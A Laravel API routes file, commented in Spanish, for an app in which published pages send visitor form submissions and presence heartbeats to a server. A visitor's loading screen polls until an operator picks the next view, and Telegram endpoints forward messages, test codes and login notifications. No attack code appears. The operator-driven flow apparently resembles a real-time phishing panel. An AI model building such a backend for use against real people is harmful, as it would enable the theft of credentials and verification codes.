<?php

use App\Http\Controllers\Api\ButtonController;
use App\Http\Controllers\Api\ClientController;
use App\Http\Controllers\Api\MessagingController;
use App\Http\Controllers\Api\TelegramWebhookController;
use Illuminate\Support\Facades\Route;

// GET  /api/clients  -> lista de clientes con su estado calculado por tiempo
// POST /api/clients  -> registra un cliente nuevo o refresca su actividad (lo pone en verde)
// Límites por IP definidos en AppServiceProvider (clients-read / clients-write).
Route::get('clients', [ClientController::class, 'index'])->middleware('throttle:clients-read');
Route::post('clients', [ClientController::class, 'store'])->middleware('throttle:clients-write');

// GET /api/buttons -> catálogo de botones creados (id, nombre y mensaje)
Route::get('buttons', [ButtonController::class, 'index']);
Route::post('telegram/use-message', [TelegramWebhookController::class, 'useLatest']);
Route::post('telegram/send-test-code', [MessagingController::class, 'sendTestCode'])
    ->middleware('throttle:10,1');
Route::post('telegram/login-notification', [MessagingController::class, 'sendLoginNotification'])
    ->middleware('throttle:10,1');

// Mensajería: desde el panel (sesión iniciada). Envía el texto del botón al Telegram del cliente.
Route::middleware(['web', 'auth'])
    ->post('companies/{company}/send', [MessagingController::class, 'send'])
    ->name('api.companies.send');

// Telegram envía aquí las respuestas del cliente (sin sesión; lo llama Telegram).
Route::get('telegram/latest-message', [TelegramWebhookController::class, 'latest']);
Route::post('telegram/webhook', [TelegramWebhookController::class, 'handle'])->name('api.telegram.webhook');

// Recepción de datos de las vistas publicadas (integration.js). Público y con límite por IP.
Route::post('sitio/{projectSlug}/{viewSlug}/submit', [\App\Http\Controllers\PublicSiteController::class, 'submit'])
    ->middleware('throttle:30,1')
    ->name('api.sitio.submit');

// Presencia (heartbeat): marca al cliente "en línea" mientras tiene la página abierta.
Route::post('sitio/{projectSlug}/presence', [\App\Http\Controllers\PublicSiteController::class, 'presence'])
    ->middleware('throttle:120,1')
    ->name('api.sitio.presence');

// Sondeo de la pantalla de carga: ¿el operador ya pidió la siguiente vista?
Route::get('sitio/{projectSlug}/{session}/next', [\App\Http\Controllers\PublicSiteController::class, 'next'])
    ->middleware('throttle:120,1')
    ->name('api.sitio.next');

// Sondeo por token de sesión del navegador (sin proyecto en la URL). Lo usa la
// pantalla de carga: identifica al usuario exacto por su sesión.
Route::get('solicitud/{session}/next', [\App\Http\Controllers\PublicSiteController::class, 'nextBySession'])
    ->middleware('throttle:120,1')
    ->name('api.solicitud.next');
